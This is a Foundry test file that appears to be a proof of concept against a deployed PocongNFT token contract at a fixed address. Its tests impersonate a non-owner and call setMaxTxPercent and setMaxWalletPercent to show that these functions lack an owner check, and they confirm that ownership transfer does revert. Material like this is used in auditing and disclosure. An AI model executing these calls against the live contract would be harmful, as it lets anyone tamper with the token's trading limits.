```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.12;

import "forge-std/Test.sol";

interface IPocongNFT {
    function owner() external view returns (address);
    function _maxTxAmount() external view returns (uint256);
    function _maxWalletToken() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function setMaxTxPercent(uint256 maxTxPercent) external;
    function setMaxWalletPercent(uint256 maxWalletPercent) external;
    function setDevWallet(address newWallet) external;
    function transferOwnership(address newOwner) external;
}

contract ExploitTest is Test {
    IPocongNFT constant target = IPocongNFT(0x5f5c745d399398a633d53cdc97b4eaeb7cd135b7);

    address attacker = address(0xdead);

    function setUp() public {
        vm.label(address(target), "PocongNFT");
        vm.label(attacker, "attacker");
    }

    function testUnauthorizedSetMaxTxPercent() public {
        uint256 totalSupply = target.totalSupply();
        uint256 originalMaxTx = target._maxTxAmount();

        // attacker (non-owner) calls setMaxTxPercent
        vm.prank(attacker);
        target.setMaxTxPercent(100); // 100% => maxTxAmount = totalSupply

        uint256 newMaxTx = target._maxTxAmount();
        assertEq(newMaxTx, totalSupply, "maxTxAmount should be set to totalSupply");
        assertTrue(newMaxTx != originalMaxTx, "maxTxAmount should have changed");
    }

    function testUnauthorizedSetMaxWalletPercent() public {
        uint256 totalSupply = target.totalSupply();
        uint256 originalMaxWallet = target._maxWalletToken();

        vm.prank(attacker);
        target.setMaxWalletPercent(100); // 100% => maxWalletToken = totalSupply

        uint256 newMaxWallet = target._maxWalletToken();
        assertEq(newMaxWallet, totalSupply, "maxWalletToken should be set to totalSupply");
        assertTrue(newMaxWallet != originalMaxWallet, "maxWalletToken should have changed");
    }

    function testOwnerProtectedFunctions() public {
        // Ensure that owner-protected functions are not callable by attacker
        vm.prank(attacker);
        vm.expectRevert("Ownable: caller is not the owner");
        target.setDevWallet(attacker);

        vm.prank(attacker);
        vm.expectRevert("Ownable: caller is not the owner");
        target.transferOwnership(attacker);
    }
}
```
